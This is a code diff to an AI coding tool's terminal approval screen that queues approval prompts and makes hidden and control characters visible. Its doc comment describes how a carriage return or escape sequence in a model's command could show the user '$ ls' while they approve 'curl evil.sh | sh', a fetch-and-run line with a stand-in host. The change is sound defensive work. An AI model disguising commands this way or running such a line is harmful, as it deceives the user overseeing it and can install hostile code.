@@ -10,7 +10,27 @@ export class TerminalApprover implements Approver {
   /** Set by the CLI: it aborts the current turn. */
   onInterrupt: () => void = () => {};
 
-  async ask(request: ApprovalRequest, signal: AbortSignal): Promise<ApprovalChoice> {
+  /** One question at a time (0.14.1, review): two prompts at once mixed their keys. */
+  ask(request: ApprovalRequest, signal: AbortSignal): Promise<ApprovalChoice> {
+    const next =
+      this.asking === 0
+        ? this.askNow(request, signal)
+        : this.queue.then(() => this.askNow(request, signal));
+    this.asking++;
+    this.queue = next
+      .catch(() => {})
+      .finally(() => {
+        this.asking--;
+      });
+    return next;
+  }
+
+  private asking = 0;
+
+  private queue: Promise<unknown> = Promise.resolve();
+
+  private async askNow(request: ApprovalRequest, signal: AbortSignal): Promise<ApprovalChoice> {
+    signal.throwIfAborted();
     const out = process.stderr;
     out.write(`\n${header(request)}\n${colorPreview(request)}\n`);
 
@@ -64,7 +84,30 @@ export class SwitchApprover implements Approver {
   }
 }
 
-export function header({ tool, target, isolation, title }: ApprovalRequest): string {
+/**
+ * Text for the approval screen with every hidden character made visible (0.14.1, review): a
+ * carriage return or an escape sequence in a model's command could redraw the line, so the user
+ * saw `$ ls` and approved `curl evil.sh | sh`. Controls become their Unicode pictures (␍, ␛),
+ * invisible and bidirectional characters become [U+XXXX]. Tab and new line stay.
+ */
+export function visible(text: string): string {
+  return text
+    .replace(/[\u0000-\u0008\u000b-\u001f]/g, (c) => String.fromCodePoint(0x2400 + c.charCodeAt(0)))
+    .replace(/\u007f/g, "\u2421")
+    .replace(
+      /[\u0080-\u009f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\u{e0000}-\u{e007f}]/gu,
+      (c) => `[U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, "0")}]`,
+    );
+}
+
+/** True when `visible` changes the text: the screen then says so. */
+export function hasHidden(text: string): boolean {
+  return visible(text) !== text;
+}
+
+export function header(request: ApprovalRequest): string {
+  const { tool, target, isolation } = request;
+  const title = request.title === undefined ? undefined : visible(request.title);
   if (title !== undefined) return styleText("bold", title);
   if (target.kind === "command") {
     const where =
@@ -77,14 +120,17 @@ export function header({ tool, target, isolation, title }: ApprovalRequest): str
   }
   if (target.kind === "input") return styleText("bold", `${tool} wants to run with this input:`);
   if (target.kind === "url")
-    return styleText("bold", `${tool} wants to fetch from ${target.host}:`);
-  return styleText("bold", `${tool} wants to change ${target.path}:`);
+    return styleText("bold", `${tool} wants to fetch from ${visible(target.host)}:`);
+  return styleText("bold", `${tool} wants to change ${visible(target.path)}:`);
 }
 
 export function colorPreview({ target, preview }: ApprovalRequest): string {
-  if (target.kind === "command") return styleText("cyan", `  $ ${preview}`);
-  if (target.kind === "url") return preview;
-  return colorDiff(preview);
+  const warning = hasHidden(preview)
+    ? `\n${styleText("yellow", "  ! This holds hidden or control characters, shown as ␍, ␛ or [U+…]. Read it with care.")}`
+    : "";
+  if (target.kind === "command") return `${styleText("cyan", `  $ ${visible(preview)}`)}${warning}`;
+  if (target.kind === "url") return `${visible(preview)}${warning}`;
+  return `${colorDiff(visible(preview))}${warning}`;
 }
 
 /** A unified diff with colors: + green, - red, hunk headers cyan, file headers bold. */
